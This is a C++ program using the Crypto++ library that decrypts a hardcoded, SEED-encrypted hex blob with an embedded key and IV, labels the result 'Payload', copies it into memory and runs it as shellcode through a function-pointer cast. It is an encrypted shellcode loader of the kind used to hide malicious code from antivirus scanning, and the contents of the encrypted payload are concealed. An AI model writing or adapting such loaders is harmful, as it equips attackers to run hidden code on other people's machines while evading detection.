
//////////////////INCLUDE LIBRARY//////////////////////////
#include "iostream"
#include <fstream>
#include "cryptopp/seed.h"
#include "cryptopp/hex.h"
#include "cryptopp/modes.h"
#include "cryptopp/osrng.h"
#include "cryptopp/base64.h"
///////////////////END OF INCLUDE LIBRARY////////////////////////////

using namespace std;
using namespace CryptoPP;

string decode(string data)
{
   std::string decoded;
   StringSource(data, true,
      new HexDecoder(
         new StringSink(decoded)
      ) // HexEncoder
   ); // StringSource

	return decoded;
}

int main()
{
   AutoSeededRandomPool prng;
   std::string keys=decode("863D76668CD6C361A81E509EA802ACB5");
   std::string IVs=decode("2538DAF6CB67B1C86DFD09FE3091D70F");

   SecByteBlock key((const byte*)keys.data(), keys.size());
   SecByteBlock iv((const byte*)IVs.data(), IVs.size());


string cipher="CA6E6505C70260CF9DD100D745B3825DD69204D2BBEFCAF66051E1BA3086CC33D479C638760C9D054EF0494F2649AC48D10081D4AFAEC69CCBC4D3C0252FC2AB0CC995D4D39C049FC3037A118E4B76BB6FB1CDD27FA62AF0761C5522E1F646F5A57F1628CD25767591DC6AAE82D8F2D76D6C7801643A30896405D208A7C7CF85316C1926EDA98C0B5D56D903FFD213C8D35B1E3ABEAF21C8287854F4CE417F74280E6DE345189DCA57BDEEEB8A38903957A3E81D6E09101A49C4FD7DB92D7A8DA167EC9567119312ACE3705EF9426CCF5673A28986A30B2AB3DD1F848D18A2B1073E7B494CA3009F5B576140ECBDD737B4C6538D8856971D88ACFC708E380507F587AE9130EDB2A3AD4D1C315485FF5AEEDD84C819802C2546299BA93E46DD6F60D4AF5DB4F94EAA387D25714E68CF7AAE9166C5B8DDDC05C54F88A8EF917573";

   std::string encoded, recovered;

   try
   {
      CBC_Mode< SEED >::Decryption d;
      d.SetKeyWithIV(key, key.size(), iv);

      // The StreamTransformationFilter removes
      //  padding as required.
      StringSource s(cipher, true,(new HexDecoder( 
       new StreamTransformationFilter(d,
		new StringSink(recovered)))
       ) // StreamTransformationFilter
      ); // StringSource

      std::cout << "Payload is : " << recovered << std::endl;
   }
   catch(const CryptoPP::Exception& e)
   {
      std::cerr << e.what() << std::endl;
      exit(1);
   }

// Convert the decoded data to a char

	char * writable = new char[recovered.size()];
	std::copy(recovered.begin(), recovered.end(), writable);

// Execute the shellcode
   	int (*ret)() = (int(*)())writable;
	ret();

return 0;   
}
